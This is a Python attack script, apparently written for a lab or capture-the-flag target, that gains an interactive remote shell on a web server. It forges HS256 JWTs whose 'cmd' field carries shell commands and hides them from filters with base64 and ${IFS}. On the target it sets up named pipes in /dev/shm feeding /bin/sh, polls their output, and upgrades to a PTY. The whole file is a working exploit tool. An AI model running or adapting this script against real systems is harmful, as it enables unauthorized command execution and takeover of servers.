#!/usr/bin/python3

import base64
import random
import requests
import threading
import time
import jwt
import datetime

class WebShell(object):

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):

        # URL. MODIFY THIS
        self.url = r"http://172.16.1.22:3000"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        base64_mkfifo = base64.b64encode(MakeNamedPipes.encode('utf-8')).decode('utf-8')
        final_base64_mkfifo = f"echo${{IFS}}{base64_mkfifo}|base64${{IFS}}-d|sh"
        self.RunRawCmd(final_base64_mkfifo, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat${{IFS}}{self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f'echo${{IFS}}-n${{IFS}}"">{self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)
        
    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        # This is where our payload code goes. MODIFY THIS
        payload = {
            "cmd": cmd,
            "exp": 1922024099
        }

        # JWT secret. MODIFY THIS
        secret = "SECRETHERE"
        token = jwt.encode(payload, secret, algorithm="HS256")

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}
       
        # Payload in User-Agent
        headers = {'Authorization': "Bearer " + token}
        try:
            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo${{IFS}}{b64cmd}|base64${{IFS}}-d>{self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        self.WriteCmd(UpgradeShell)

prompt = "shell> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
